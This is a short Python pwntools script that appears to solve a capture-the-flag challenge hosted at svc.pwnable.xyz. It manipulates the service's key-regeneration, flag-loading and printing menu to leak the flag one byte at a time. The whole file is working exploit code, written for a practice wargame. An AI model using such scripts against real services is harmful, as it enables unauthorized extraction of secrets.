from pwn import *

p = remote("svc.pwnable.xyz", 30006)

def regen_key(size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"len: ", str(size).encode())

def load_flag():
    p.sendlineafter(b"> ", b"2")

def print_flag(k):
    p.sendlineafter(b"> ", b"3")
    p.sendafter(b"? ", k.encode())
    if k == 'y':
        p.sendafter(b": ", b"ABCD")

flag = 'F'
for i in range(1, 0x3f):
    print_flag('y')
    regen_key(i)
    load_flag()
    regen_key(64)
    print_flag('n')
    flag += chr(p.recv(0x3f)[i])
    print("Flag : " + flag)